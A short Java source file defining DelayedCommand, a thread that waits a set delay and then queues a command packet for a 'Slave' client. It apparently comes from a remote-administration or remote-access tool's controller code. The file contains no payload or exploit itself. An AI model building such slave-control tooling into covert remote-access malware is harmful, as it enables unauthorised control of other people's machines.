package com.redpois0n.threads;


import com.redpois0n.Slave;
import com.redpois0n.packets.in.PacketBuilder;

public class DelayedCommand extends Thread {
	
	private Slave slave;
	private PacketBuilder packet;
	private long ms;
	
	private DelayedCommand(Slave slave, PacketBuilder packet, long ms) {
		super("Delayed thread");
		this.slave = slave;
		this.packet = packet;
		this.ms = ms;
	}
	
	public void run() {
		try {
			Thread.sleep(ms);
			slave.addToSendQueue(packet);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
	public static DelayedCommand start(Slave slave, PacketBuilder packet, long ms) {
		DelayedCommand cmd = new DelayedCommand(slave, packet, ms);
		cmd.start();
		return cmd;
	}

}
